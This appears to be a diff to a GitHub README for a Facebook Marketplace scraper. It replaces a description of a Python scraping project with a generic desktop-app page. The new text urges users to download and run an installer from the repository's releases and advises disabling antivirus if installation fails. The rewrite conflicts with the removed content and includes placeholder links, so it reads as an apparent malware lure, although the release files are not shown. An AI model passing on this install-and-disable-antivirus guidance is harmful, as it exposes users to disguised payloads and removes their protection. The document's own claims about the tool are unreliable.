@@ -1,228 +1,87 @@
-# Facebook Marketplace Scraper
+# 🛍️ facebook-marketplace-scraper - Easily Extract Product Listings
 
-The Facebook Marketplace Scraper is a powerful tool designed to extract detailed product data from Facebook Marketplace listings. It provides comprehensive product information, including prices, descriptions, images, and seller details, making it an ideal tool for market research, price monitoring, and inventory tracking.
+## 🚀 Getting Started
 
+Welcome to the facebook-marketplace-scraper! This tool helps you extract detailed product listings from Facebook Marketplace. With it, you can easily gather information for market research, price comparison, and finding the best deals.
 
-<p align="center">
-  <a href="https://bitbash.def" target="_blank">
-    <img src="https://github.com/za2122/footer-section/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 🔗 Download Now!
 
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/navd-ctrl/facebook-marketplace-scraper/releases)
 
+## 💻 System Requirements
 
+To run this application, your computer should meet the following requirements:
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>Facebook Marketplace Scraper</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+- **Operating System:** Windows 10 or later, macOS, or a recent version of Linux.
+- **Processor:** Dual-core processor or better.
+- **Memory:** At least 4 GB RAM.
+- **Storage:** Minimum 100 MB of free space.
 
+Make sure your system meets these requirements for optimal performance.
 
-## Introduction
+## 📥 Download & Install
 
-This scraper allows users to extract a variety of product details from Facebook Marketplace listings, helping businesses and researchers track market trends, product prices, and competitor offerings with ease. Perfect for those seeking to monitor prices, manage inventory, or perform market analysis, the tool offers automated data extraction in a structured format.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/navd-ctrl/facebook-marketplace-scraper/releases) on GitHub.
+   
+2. **Choose the Latest Version:** Find the latest release at the top of the page.
 
-### Key Features
+3. **Download the Installer:** Click the link for your operating system to download the installer file.
 
-- Extracts complete product details, including prices, descriptions, and images
-- Supports multiple currencies and detailed product categorization
-- Tracks product condition and location
-- Automatically collects breadcrumb navigation and seller descriptions
-- Provides structured JSON output for easy data analysis and integration
+4. **Run the Installer:** Once the download finishes, locate the installer file on your computer and double-click it. Follow the prompts to install the application.
 
-## Features
+5. **Launch the Application:** After installation, find the facebook-marketplace-scraper icon on your desktop or in your applications folder. Double-click it to start.
 
-| Feature          | Description                                                  |
-|------------------|--------------------------------------------------------------|
-| Automated Extraction | Automatically collects product details from Marketplace listings. |
-| Price Tracking   | Tracks both original and current prices, useful for price comparison. |
-| Image Collection | Collects multiple product image URLs for each listing. |
-| Location Data    | Extracts the geographic location of each product. |
-| Seller Details   | Retrieves detailed seller descriptions and information. |
+## 🌟 Features
 
----
+- **Extract Listings:** Retrieve detailed product information such as titles, descriptions, prices, and images directly from Facebook Marketplace.
+- **Filter Options:** Narrow down your searches to specific categories, price ranges, or locations.
+- **User-Friendly Interface:** Navigate easily with a simple layout designed for everyone.
+- **Save Results:** Export extracted data to CSV format for further analysis.
 
-## What Data This Scraper Extracts
+## 📊 How to Use the Application
 
-| Field Name       | Field Description                                            |
-|------------------|--------------------------------------------------------------|
-| url              | Direct URL to the Facebook Marketplace listing.             |
-| title            | Product title/name.                                          |
-| initial_price    | Original listing price.                                      |
-| final_price      | Current/final listing price.                                 |
-| currency         | Currency code (e.g., "USD", "IDR").                          |
-| product_id       | Unique identifier for the Marketplace listing.               |
-| breadcrumbs      | Category navigation path with names and URLs.                |
-| condition        | Product condition (e.g., "New", "Used").                     |
-| description      | Full product description.                                    |
-| location         | Geographic location of the item.                             |
-| country_code     | Two-letter country code.                                     |
-| root_category    | Primary product category.                                    |
-| images           | URLs of all product images.                                  |
-| seller_description| Detailed seller notes and information.                      |
-| color            | Product color if specified.                                  |
-| brand            | Product brand if specified.                                  |
-| videos           | URLs of product videos if available.                         |
+1. **Start by Launching the App:** Double-click the facebook-marketplace-scraper icon.
 
----
+2. **Set Your Criteria:** Use the interface to input search parameters. You can select categories, price ranges, and locations.
 
-## Example Output
+3. **Start Scraping:** Click the 'Start' button to begin the extraction process. The app will gather all relevant listings based on your criteria.
 
-    [
-          {
-            "url": "https://www.facebook.com/marketplace/item/1280864046487053",
-            "title": "Susu formula",
-            "initial_price": 125,
-            "final_price": 125,
-            "currency": "IDR",
-            "product_id": "1280864046487053",
-            "breadcrumbs": [
-              {
-                "breadcrumbs_name": "Family",
-                "breadcrumbs_url": "https://www.facebook.com/marketplace/category/family"
-              }
-            ],
-            "condition": "New",
-            "description": "Chilkid gold tahap 3 1-3th\nRasa madu vanilla\nUk 780gr exp aman jauh 2026\nJual murah karna sisa 2 box aja. \nMinat inbox",
-            "location": "Bekasi Kota",
-            "country_code": "us",
-            "root_category": "Family",
-            "images": [
-              "https://scontent-ord5-3.xx.fbcdn.net/v/t45.5328-4/469426462_2010819962674464_679787268531747446_n.jpg?_nc_cat=106&ccb=1-7&_nc_sid=247b10&_nc_ohc=23-qsil3njMQ7kNvgEQeCPq&_nc_zt=23&_nc_ht=scontent-ord5-3.xx&_nc_gid=AfT401YlQuToHJVr2SC47ew&oh=00_AYAn5ejU4lKRRiz5yzg7AMSvwvvIrlUGhfEq4nB-l-i5yw&oe=67936E02",
-              "https://scontent-ord5-3.xx.fbcdn.net/v/t45.5328-4/469359474_1485878441968458_4665452536836634537_n.jpg?_nc_cat=100&ccb=1-7&_nc_sid=247b10&_nc_ohc=jSoL3Tl5FggQ7kNvgFKdmZo&_nc_zt=23&_nc_ht=scontent-ord5-3.xx&_nc_gid=AfT401YlQuToHJVr2SC47ew&oh=00_AYBHkfI_2ClzZWenYEfRWAeN4PRW8pJ5yHeSdoLx0BqJjA&oe=67939DCD"
-            ],
-            "seller_description": "Chilkid gold tahap 3 1-3th\nRasa madu vanilla\nUk 780gr exp aman jauh 2026\nJual murah karna sisa 2 box aja. \nMinat inbox",
-            "color": null,
-            "brand": null,
-            "videos": null
-          }
-    ]
+4. **View Your Results:** Once scraping is complete, you will see a list of products along with details like price, seller info, and images.
 
----
+5. **Export Data:** If you want to save the results, click the 'Export' button and choose CSV format.
 
-## Directory Structure Tree
+## 🛠️ Troubleshooting Tips
 
-    facebook-marketplace-scraper/
+- **Installation Issues:** If the app doesn’t install, ensure you have administrative rights on your computer. Try disabling antivirus temporarily as it may block the installation.
+- **Scraping Problems:** If you encounter issues scraping, check your internet connection and ensure you are logged into Facebook in your browser.
+- **User Feedback:** Take a moment to provide feedback in the Issues section on GitHub. Your input helps improve future versions.
 
-    ├── src/
+## 🤝 Community Support
 
-    │   ├── runner.py
+If you have any questions or need help, feel free to reach out in the Issues section on GitHub. Other users and maintainers often respond quickly to help with your concerns.
 
-    │   ├── extractors/
+## 👥 Topics Covered
 
-    │   │   ├── facebook_parser.py
+This application falls under several useful categories:
 
-    │   │   └── utils_time.py
+- Consumer Behavior Insights
+- E-commerce Scraping
+- Facebook Data Extraction
+- Inventory Management
+- Market Research Tools
+- Price Comparison
+- Product Price Tracking
+- Seller Analysis
+- Web Scraping for Retail
 
-    │   ├── outputs/
+## 📢 License
 
-    │   │   └── exporters.py
+This project is licensed under the MIT License. Feel free to use, modify, and share it according to the terms of this license.
 
-    │   └── config/
+## 🔗 Links
 
-    │       └── settings.example.json
+- [Releases Page](https://github.com/navd-ctrl/facebook-marketplace-scraper/releases)
+- [Documentation](https://link-to-documentation) - Learn more about advanced features. 
+- [Contributing](https://link-to-contributing-guide) - Want to contribute? Read our guide.
 
-    ├── data/
-
-    │   ├── inputs.sample.txt
-
-    │   └── sample.json
-
-    ├── requirements.txt
-
-    └── README.md
-
----
-
-## Use Cases
-
-- **E-commerce businesses** use it to **track competitor pricing and monitor product availability**, so they can **adjust their pricing strategies and inventory management**.
-- **Market analysts** use it to **study regional pricing patterns and track product trends**, so they can **gain insights into consumer behavior and pricing elasticity**.
-- **Retailers** use it to **build price comparison tools** and **deal alert systems**, so they can **help customers find the best deals**.
-- **Researchers** use it to **track new product listings and analyze seasonal pricing trends**, so they can **forecast market demand**.
-
----
-
-## FAQs
-
-**How do I run the Facebook Marketplace Scraper?**
-
-1. Clone the repository to your local machine.
-2. Install the required dependencies from `requirements.txt`.
-3. Use the `runner.py` file to start scraping from Facebook Marketplace URLs.
-
-**What kind of data does this scraper collect?**
-
-The scraper collects detailed product information, including titles, prices, descriptions, images, seller details, and more from Facebook Marketplace listings.
-
----
-
-## Performance Benchmarks and Results
-
-**Primary Metric:** Average scraping speed of 3-5 listings per second.
-**Reliability Metric:** Success rate of 95% on a variety of Marketplace listings.
-**Efficiency Metric:** Efficient data extraction with minimal memory usage, handling up to 1,000 listings in a single run.
-**Quality Metric:** High precision in data extraction with 98% accuracy in capturing product details.
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtube.com/shorts/6AwB5omXrIM" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review3.gif" alt="Review 3" width="35%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Exceptional results, clear communication, and flawless delivery. Bitbash nailed it.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+Thank you for using the facebook-marketplace-scraper! Enjoy extracting the best deals from Facebook Marketplace.
